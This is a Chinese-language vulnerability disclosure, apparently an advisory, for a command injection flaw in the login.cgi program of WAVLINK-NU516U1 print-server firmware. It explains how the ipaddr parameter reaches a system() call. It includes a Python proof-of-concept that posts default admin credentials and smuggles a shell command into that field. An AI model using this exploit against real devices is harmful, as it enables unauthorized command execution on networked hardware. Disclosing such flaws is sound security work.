漏洞概述

Wavlink是一家专注于网络设备和通信解决方案的公司，提供优质的路由器、扩展器和网络配件。其下的WAVLINK-NU516U1型号的固件，功能用于提供打印机服务器网卡，其登录界面存在命令注入漏洞，允许攻击者完成授权命令执行。

漏洞细节

对固件解包之后，找到login.cgi程序，使用ida打开在main函数下，在main（ida中显示为ftext）函数中，比对是否是正常登录请求，正常登录请求由函数sub_4012A0进行处理


<img width="994" height="651" alt="image" src="https://github.com/user-attachments/assets/40c49ea5-14a4-4f5d-8763-bf295a10baee" />

在函数sub_4012A0中获取ipaddr的参数值赋值给v9

<img width="942" height="408" alt="image" src="https://github.com/user-attachments/assets/9b619bf6-afe7-4396-ae75-3c32a6868467" />

在登录验证成功之后获取v9的参数值进行拼接到system执行的参数v31中

<img width="1341" height="342" alt="image" src="https://github.com/user-attachments/assets/334a86e9-70a3-4bcd-bdca-14808e9d7c82" />


poc

```
import requests

url = "http://192.168.1.2/cgi-bin/login.cgi"

headers = {
    "Host": "192.168.1.2",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://192.168.1.2",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://192.168.1.2/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "close"
}

data = {
    "newUI": "1",
    "page": "login",
    "username": "admin",
    "langChange": "0",
    "ipaddr": "192.168.1.1$( echo 1 >/poc.txt)",
    "login_page": "login.shtml",
    "homepage": "main.shtml",
    "sysinitpage": "sysinit.shtml",
    "wizardpage": "wizard.shtml",
    "hostname": "192.168.1.2",
    "key": "M90920320",
    "lang_select": "en",
    "password": "admin",
    "password_vlaue": "7a72c504b83ee9da9d2d22eb83248670"
}
resp = requests.post(url, headers=headers, data=data)

print(resp.status_code)
print(resp.headers)
print(resp.text)
```



















